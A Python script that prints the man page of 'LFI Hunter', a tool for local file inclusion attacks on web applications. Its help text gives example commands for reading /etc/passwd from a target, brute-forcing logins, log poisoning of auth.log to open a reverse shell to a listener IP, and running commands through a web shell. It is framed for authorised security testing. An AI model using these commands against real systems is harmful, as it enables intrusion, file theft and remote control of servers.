#!/usr/bin/env python3


import os
import subprocess
class ManPage:
   def __init__(self,**kwargs):
       self.man_info()
   def man_info(self,**kwargs):
       try:
                     INFO = """
              NAME
                     LFI Hunter - Command-line tool for Local File Inclusion (LFI) vulnerability testing on web applications

              SYNOPSIS
                     LFI_Hunter [OPTIONS]

              DESCRIPTION
                     LFI Hunter is a powerful command-line tool designed for testing and
                     exploiting Local File Inclusion (LFI) vulnerabilities in web applications.
                     It offers options for authenticated and unauthenticated LFI attacks,
                     parameter fuzzing, reverse shell setup, and the reading of specific files. 
                     This tool assists ethical hackers and security researchers in assessing web
                     application security by exploiting file inclusion vulnerabilities in a controlled

                     environment.

                     **LFI Hunter is licensed for user use only, with no permission for code modification.** 
                     It is available on GitHub: https://github.com/jac11/LFI_Hunter.
              OPTIONS
                     -h, --help                      show this help message and exit
                     --man                           show this man page
                     -UV, --Vulnurl                  Target URL for the vulnerable web application 
                     --auth                          Enable authentication mode
                     -F, --filelist                  Read from an LFI wordlist file
                     -C, --Cookie     (required)     Provide the login session cookie              
                     -B, --base64                    Enable decoding of base64-filtered PHP code
                     -R, --read                      Specify a file to read from the target machine
                     -UF, --UserForm                 Specify the HTML login form username field
                     -PF, --PassForm                 Specify the HTML login form password field
                     -P, --password                  Specify a password
                     -p, --readpass                  Read a password from a file
                     -LU, --loginurl                 Provide the login URL for authentication mode
                     -U, --user                      Specify a username
                     -u, --readuser                  Read a username from a file
                     -A, --Aggressiv                 Enable aggressive mode
                     --port                          Set the port for netcat
                     -S, --shell                     Set up a reverse shell connection
                     -Z, --fuzzing                   Enable brute-force mode
                     --config                        Use a configuration file with all options
                     -FP, --PARAME                   parameter fuzzing [replace the parameter with PARAME in url]
                     -PL, --paramslist               parameter fuzzing wordlist
                     -s,  --status                   Filter parameter with HTTP status responses
                     --webshell                      Execute commands via web shell directly from the command line for remote server interaction.

                     -UV, --Vulnurl URL
                            Specifies the target URL for the web application vulnerable to LFI. 
                            The URL must include the path where testing will be performed.
                            Example:
                            LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt 

                     --auth

                            Enables authentication mode, allowing the tool to interact with restricted areas 
                            within the application that require login credentials.
                            This mode is beneficial for testing areas accessible only to logged-in users.

                     -F, --filelist FILE

                            Specifies a wordlist file containing paths or filenames to attempt during the LFI attack. 
                            The tool will iterate through each line of the wordlist to identify vulnerable files.
                            by default if not wordlist specified. tool will Using the internal default wordlist.
                            Example:
                            LFI_Hunter -UV http://example.com/vulnerable_path?file=   -C session_cookie.txt  -F lfi_wordlist.txt
                           

                     -C, --Cookie FILE

                            This option specifies a file containing a session cookie used for maintaining an authenticated session 
                            with the target web application. The command attempts to exploit a local file inclusion vulnerability 
                            at the specified URL while utilizing the session cookie read from the provided file (e.g., session_cookie.txt).
                            By using this option, 
                            you can test the LFI vulnerability at the given URL without passing credentials directly in the command line.
                            This is particularly useful for handling session cookies that may contain special characters 
                            that could lead to errors if passed directly in the terminal.

                            Ensure that the specified file contains valid session cookie 
                            information needed to maintain the session with the target application.
                            Example:
                            LFI_Hunter -UV http://example.com/-UV http://example.com/vulnerable_path?file=  -C session_cookie.txt  --auth 
                            LFI_Hunter -UV http://example.com/-UV http://example.com/vulnerable_path?file=  -C session_cookie.txt  

                     -B, --base64

                            Enables the use of the PHP filter php://filter/read=convert.base64-encode/resource=
                            This option allows for decoding base64-encoded PHP code retrieved from the target server. 
                            It can be particularly useful for uncovering sensitive information or hidden code segments that may be 
                            obfuscated in base64 format. Additionally, this option may help bypass certain security measures 
                            implemented on the website.
                            Example:
                            LFI_Hunter -UV http://example.com/-UV http://example.com/vulnerable_path?file=  -C session_cookie.txt  -B

                     -R, --read FILE

                            Specifies a file to attempt reading from the target machine. 
                            Common file paths for LFI attacks include /etc/passwd and configuration files.
                            Example:
                            LFI_Hunter  -UV http://example.com/vulnerable_path?file=  -C session_cookie.txt  -R /etc/passwd

                     -UF, --UserForm FIELD

                            Specifies the HTML form field for the username input on the login form. 
                            Useful when the field name does not follow standard conventions.
                            Example:
                            LFI_Hunter -LU  http://example.com/login   -UV http://example.com/vulnerable_path?file= -C session_cookie.txt  --auth -UF login_user

                     -PF, --PassForm FIELD

                            Specifies the HTML form field for the password input on the login form,
                            allowing customization for applications with non-standard form field names.
                            Example:
                            LFI_Hunter -LU  http://example.com/login  -UV http://example.com/vulnerable_path?file= -C session_cookie.txt --auth -PF login_pass

                     -P, --password PASSWORD

                            Allows the direct input of a password for login attempts.
                            For consider using this option with caution or combining it with --auth. 
                            Example:
                            LFI_Hunter -LU http://example.com/login  -UV http://example.com/vulnerable_path?file= -C session_cookie.txt  --auth -U admin -P mypassword

                     -p, --readpass FILE

                            Reads the password from a specified file rather than directly entering it in the command. 
                            This approach is often preferred for automation scripts.
                            Example:
                            LFI_Hunter -UV http://example.com/-UV http://example.com/vulnerable_path?file= -C session_cookie.txt /login --auth -p password_file.txt

                     -LU, --loginurl URL 

                            Provides the login URL for applications where the login path differs from the main application path. 
                            This can streamline access to restricted areas of the site.
                            Example:
                            LFI_Hunter -UV http://example.com/vulnerable_path?file=  -C session_cookie.txt  --auth -LU http://example.com/login

                     -U, --user USERNAME

                            Specifies a username for login attempts, allowing interaction with 
                            the authenticated sections of the application.
                            Example:
                            LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt /login --auth -U admin

                     -u, --readuser FILE

                            Reads the username from a specified file instead of entering it directly. 
                            Useful for testing multiple usernames.
                            Example:
                            LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt /login --auth -u usernames.txt

                     -A, --Aggressiv

                            Enables aggressive mode, which increases the number and speed of requests 
                            to expedite the testing process. This mode is recommended only for controlled environments,
                            as it can significantly increase the server load. In aggressive mode, 
                            the tool sends different payloads to the server and compares the length of the responses. 
                            If the response length exceeds a certain threshold, it indicates that different data has been read.
                            Example:
                            LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt -A

                     -S, --shell CONNECTION

                            Sets up a reverse shell connection to a specified IP address,defining the listener (LHOST). 
                            If the target system is vulnerable,this feature enables remote access for testing purposes. 
                            Use this option to specify the IP address and port .

                            Additionally, if the tool can read a log or authentication file, 
                            it can inject (or "poison") the log file with PHP code to establish a reverse shell. 
                            This technique allows for shell access when standard methods are restricted.

                            Examples:
                            This command specifies /var/log/auth.log as the target file for log poisoning.
                            LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt -S 192.168.1.5 --port 4444 -R /var/log/auth.log
                            LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt -S 192.168.1.5 --port 4444 -Z
                            
                     --webshell 
                    
                            The --webshell option enables an attacker or tester to execute commands remotely on a target server through a web application. 
                            After sending the command via HTTP,the tool saves both the initial and the altered web responses. 
                            By comparing them, it detects changes that suggest successful execution of the command. 
                            This mimics the experience of using a web shell directly from the browser, allowing real-time
                            interaction with the server without needing a socket connection.
                            Example:
                            LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt  -R /var/log/auth.log --webshell     


                     --port PORT

                            Specifies the local port (LPORT) to use for operations involving network connections, 
                            such as reverse shells. This option allows the tool to use a custom port instead of the default.
                            If not specified, the listener will default to port 7777.
                            Example:
                            LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt -S 192.168.1.5 --port 4444 R /var/log/auth.log 
                            LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt -S 192.168.1.5 --port 4444 -Z        

                     -Z, --fuzzing

                            Enables brute-force or fuzzing mode,
                            attempting a wide range of values for parameters to test 
                            for potential vulnerabilities .
                            Example:
                            LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt -Z


                     --config FILE

                            Specifies a configuration file that loads predefined options, 
                            streamlining complex tests by reducing the need for repeated command-line input. After a full command is executed,
                            a configuration file is automatically generated based on that command,
                            allowing for easy reuse of the same settings in future runs.
                            To use the same command but overwrite options, 
                            specify the --config file and add new parameters as needed.

                            Example:
                            LFI_Hunter --config example.com.ini
                            
                            To modify settings in the configuration file, you can run:
                            
                            Example:
                            LFI_Hunter --config site.com.ini -C Cookie


                     -FP, --PARAME

                            Executes parameter fuzzing by replacing specified parameters with "PARAME" in the URL.
                            Allows testing of different values for injection vulnerabilities.
                            Example:
                            LFI_Hunter -FP http://example.com/vulnerable_path/?PARAME=file.php

                     -PL, --paramslist FILE

                            Provides a wordlist file for parameter fuzzing, containing
                            various parameters to insert into the URL for testing purposes.
                            Example:
                            LFI_Hunter -FP http://example.com/vulnerable_path?file= -C session_cookie.txt  -PL fuzz_params.txt

                     -s, --status STATUS

                            Filter parameter to specify an HTTP status code for filtering responses.
                            Accepts a single HTTP status code (e.g., 200, 404, 500), 
                            to match client errors.

              EXAMPLES
              Basic URL scan with authentication and aggressive mode enabled:
              LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt  --auth -A -LU http://example.com/login.php -U admin -P password

              Use base64 decoding to reveal hidden PHP code and  fuzzing Mode:
              LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt  -B -Z 

              Parameter fuzzing using a custom wordlist:
              LFI_Hunter -FP http://example.com/vulnerable_path?file= -C session_cookie.txt -PL fuzz_wordlist.txt
              
              Parameter fuzzing with  Filter parameter to specify an HTTP status code :
              LFI_Hunter -FP http://example.com/vulnerable_path?file= -C session_cookie.txt -PL fuzz_wordlist.txt -s 301
              
              Read the /etc/passwd file from a vulnerable URL:
              LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt  -R /etc/passwd

              Reverse shell setup to a LHOST IP and LPORT:
              LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt -R /var/log/auth.log -S 192.168.0.10 --port 5555

              EXIT STATUS
                     0      Successful execution.
                     1      General error, such as invalid command input.
                     2      Misuse of command options.

              FILES
                     config.txt
                            Configuration file for LFI Hunter that stores default options, useful for automation.

                     lfi_wordlist.txt
                            Wordlist file for LFI testing, containing various common paths and filenames.

                     fuzz_params.txt
                            Wordlist for parameter fuzzing, listing potential parameters for injection.

              SEE ALSO
                     nc(1), curl(1), wget(1), python(1)

              AUTHOR
                     Developed by jac11. For issues, contributions, or further information, 
                     visit the GitHub repository: https://github.com/jac11/LFI_Hunter.

              LICENSE
                     LFI Hunter is licensed for user use only, with no permission to modify any source code.
              """
                     subprocess.run(['echo', INFO], text=True, check=True, stdout=subprocess.PIPE)
                     subprocess.run(['more'], input=INFO, text=True)
       except KeyboardInterrupt:
              exit()              
if __name__=='__main__':
       ManPage()

